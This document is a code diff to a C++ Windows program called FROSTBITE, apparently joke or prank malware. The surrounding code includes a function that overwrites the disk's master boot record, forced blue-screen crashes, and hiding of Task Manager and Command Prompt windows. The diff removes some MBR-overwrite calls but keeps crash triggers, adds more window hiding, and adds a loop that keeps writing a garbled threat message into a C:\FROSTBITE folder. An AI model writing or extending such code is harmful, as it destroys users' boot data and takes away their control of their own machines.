@@ -20,6 +20,14 @@
 
 using namespace std;
 
+void createFile(const char *path, string content, string filename) {                                                                                                            
+    _mkdir(path);
+    ofstream file;
+    file.open(path + filename, ios_base::out);
+    file << content;
+    file.close();
+}
+
 bool overwriteMBR() {
     DWORD write;
     char mbrData[MBR_SIZE];
@@ -199,33 +207,29 @@ int main(int argv, char** args) {
 
     int clicks = 0;
     int lastclicks = 0;
-    int clickdifference = 5;
+    int clickdifference = 10;
 
     SDL_Event event;
     HWND hwnd;
     HWND hwnd1;
     while (running) {
+        createFile("C:\\FROSTBITE\\", "Y̴̡̡̢̙̗̖̫̗͚͉͈̜̣̗̮̣͊͑́̿̊̔̔̃͊͆̒̕͘͝Ō̶̠̝͓̞̝̩̱͓̆̈́̄̃̀͐͐U̶̢̡̡̨̨͓̫͉͓̩͕͙̝̝̻͖̽̐̓̋̅̽̄͋͆̌̑̎͋̔͐̀̅́̚͝R̴̡̡̧̬͍̟̳̟̣̞͍̰͈̻̖͌͌̄͑̂͛̓͌̒̈͂̒̀̕͘̕̚͝͝ ̸̧̧̧̣̩̬̫̺͎̳͖̝͍̖̻̺̦͎̞̽͜Ç̷̬̦̦̱͔͚̭̺͕͙͇̜̦͚̮͆́́̆̅́̍͌̌̋̏̓̀̉̋͂̕̚͜͜͝͝͝ͅO̷̧̢̡͍͓͕̰̖͕̗̥͇̺͖̱̤̔͆̅̈́̅̒̊͑̋̋̂͆̈̀͂̓̓̚̚͝M̵̛͓͍̣̣̆͛̆̏̒̔͂̽̌͗̍͆̈̚̚͘͘̚̚P̷̧̛̮̦̟̣̦͈̩̮͓̥̙̥͇̝̣̺͕̠̹͕͐̽̀̈̓̏̆̓̆̋̏̔̈̀̏̂͠͝Ü̸̡̥͖͍̘̥̭̣̱̪̼̩͖͚̮̿̏̃͂̒́̆̌͆̇̅̓̓́͐̉̆̋̕̕͝T̷̝͎̼̞̻̙̃̒͜E̵̢͎̘͈̫͖̩̮̼͉̣̹͙̦͎̯̥̣̜̠͓͓̙͂̈̓̽̒͒͒̈͊͜͠Ř̵̼̟̲͖̯̟̗̗̺̜͔̞̫͇̖͖̫̦̖̤͘ ̸͙̏̓̍̆̐̏͊̊̀̀̍͐̄̉̄̎̄̊̚̕͝͝͝Ẅ̴̡̱̟̹͓̥̹̱͇̰̘̥̫͉̥̤̅̿̅̂̊͋͂Ỉ̸̢̨̡͇̬̯̰̲̝͓͍̘̪̻̟͈̥̺̖̋̀̓̈́̌͒͛͗̂̐͂̈́͆̂̆̅́͗̂̇L̶̨̼͙̭̻͖̇̍͜Ḻ̵̨̥̲̖͕̖̣͕͖̫̻͌͊̑̉̂͂́̅̈́̿̄̽̑̚͠ ̷̡̧̢̩̳̘͉͖͍͇̤͔̪̰̦̲̫̪̹̩͓͋̏̓͂͂̈̓͆͌̈́͌̐͋̂͑̓̽̕͠͠͝͠F̵̡̢̧̘͎͙͈̳̗̫͓͇̖̥̥͎̻̖̾̂̐̽̕͝Ą̶̺͉͎͍͈̟̩̼͋̂̉̃̈̈́̄̈́͑̆̏̈́͊̇̇̎͑́Ḷ̵̨̟̙͎̟̅̆̾̇͐̍̿̽͊͂̌̽́̅̈̀̅̔̚̕͝͠͝ͅL̷̨̢̛̞̭͖̠͕̙̜̻͇̯̯̤̮̬̫͍͔͍͌̚͜ ̸͈̼̪̖̰̳̾̇͜T̸̡̨̧̨̛͕̝͉͇̰͚͓̝̱̝̠̙͍̬̞̝̤̙̣͑̿͛̔̏̌̋̿̎̏̀̌͆̈́̐̇̆̚͠͝Ȏ̴͍͇̳͖̳͎̖̟̼̦̪͔͚̝̝̥̙̺̫͔̖͊͗̊́̍̅̃̅̃̒͑̔̄̿̄̏̊͐̆̅̚͠ ̵̢̯̠͙͉͈̙̇̽͊͠F̶̡̦̱̦̪̤̞͎̦̜͚͈̔̑͌̈́̀̒͐͐́̀̓̈̂̃̚͘̕͠R̷̫͖̒͂̒́͒̀̊̎́̅͂͋̓̊̑̒͂̈̇͋̿̚̚Ò̵̦̱̘͚͉̤̝̲̀Ş̸̧̢̛͈͇̬̞̞̥̯̙̱̼͔̭̗̦̻͓̻̌́̐̒̎̽̂̒̋͒͘͝Ţ̸̧̛̛͉̬͕̥͈͉̣̦̼̱͓̝̼̯̭̰̯̼̣̘̀̑́͛̒͋́̌̀̍̏́̍̈́̏́̚͝B̶̛͉̭͎̣̠̩̘͐͋̀̔̓̿́̆́̓̐̍̂̀͆͒̀̂̚͝I̶͕̻̋̏͋̍̂͒̉͛̀͑͋͆̈̏͌̉͌͂́̓͑̑͗͝Ţ̵̢̢̨̧̢̖̰̲̼̪̞̻̲̤̝̺̺̪̫͕̠͙̌̀̑̿̈̕͘͠ͅĘ̸̢̥̣̻̪̹̙̣̤̬̯̘̓̀̆̄̌̐̉̂́̆̿̈́͊̋̍̈́̉̔͆͑̚͘͠", to_string(time));
+
         hwnd = FindWindowA(NULL, "Task Manager");
         hwnd1 = FindWindowA(NULL, "Command Prompt");
 
         if (hwnd1) {
             ShowWindow(hwnd, 0);
 
-            if (safeMode == false) {
-                overwriteMBR();
-            }
-
-            triggerBSOD();
+            running = false;
+            survived = false;
         }
 
         if (hwnd) {
             ShowWindow(hwnd, 0);
 
-            if (safeMode == false) {
-                overwriteMBR();
-            }
-
-            triggerBSOD();
+            running = false;
+            survived = false;
         }
 
         if (currentTemp == deathTemp) {
@@ -293,6 +297,23 @@ int main(int argv, char** args) {
     while (! survived) {
         createEffects();
 
+        hwnd = FindWindowA(NULL, "Task Manager");
+        hwnd1 = FindWindowA(NULL, "Command Prompt");
+
+        if (hwnd1) {
+            ShowWindow(hwnd, 0);
+
+            running = false;
+            survived = false;
+        }
+
+        if (hwnd) {
+            ShowWindow(hwnd, 0);
+
+            running = false;
+            survived = false;
+        }
+
         if (safeMode) {
             triggerBSOD();
         }
@@ -306,6 +327,8 @@ int main(int argv, char** args) {
   	            MB_ICONINFORMATION | MB_OK
 
                 );
+
+                return 0;
             }
             else {
                 triggerBSOD();
